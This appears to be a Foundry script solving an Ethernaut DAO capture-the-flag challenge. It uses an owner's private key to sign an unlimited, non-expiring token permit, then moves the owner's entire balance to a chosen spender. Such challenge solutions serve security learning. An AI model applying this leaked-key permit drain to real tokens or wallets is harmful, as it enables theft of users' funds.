// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./EthernautDaoToken.sol";
import "forge-std/Vm.sol";
import "src/utils/PermitLibrary.sol";

function playerScript(
    address edtAddress,
    uint256 ownerPrivateKey,
    address spenderAddress,
    Vm vm
) {
    address ownerAddress = vm.addr(ownerPrivateKey);
    EthernautDaoToken edt = EthernautDaoToken(edtAddress);

    assert(edt.paused() == false);

    uint256 value = type(uint256).max;
    uint256 deadline = type(uint256).max;

    bytes32 digest = PermitLibrary.getDigest(
        edtAddress, ownerAddress, spenderAddress, value, deadline
    );
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPrivateKey, digest);

    edt.permit(ownerAddress, spenderAddress, value, deadline, v, r, s);
    edt.transferFrom(ownerAddress, spenderAddress, edt.balanceOf(ownerAddress));
}
